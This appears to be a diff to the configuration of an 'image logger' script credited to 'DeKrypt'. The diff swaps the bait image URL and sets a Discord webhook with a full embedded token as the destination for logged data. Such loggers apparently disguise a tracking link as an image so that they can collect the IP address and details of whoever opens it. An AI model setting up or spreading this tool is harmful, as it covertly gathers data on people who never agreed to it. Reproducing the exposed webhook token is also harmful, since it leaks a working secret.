@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1502926491980140686/QTykv12p9PlF43JIkFuWf5w-HufQuOYHumcX8liDoyWgNuCuRT--j4OcaOBw7UR6XXj8",
-    "image": "https://makerworld.bblmw.com/makerworld/model/USde8e05334c2686/design/2025-07-07_a9cb0b7d5f3d18.png?x-oss-process=image/resize,w_400/format,webp", # You can also have a custom image by using a URL argument
+    "image": "https://makerworld.com/en/search/models?keyword=tag%3A+tungtungtung", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
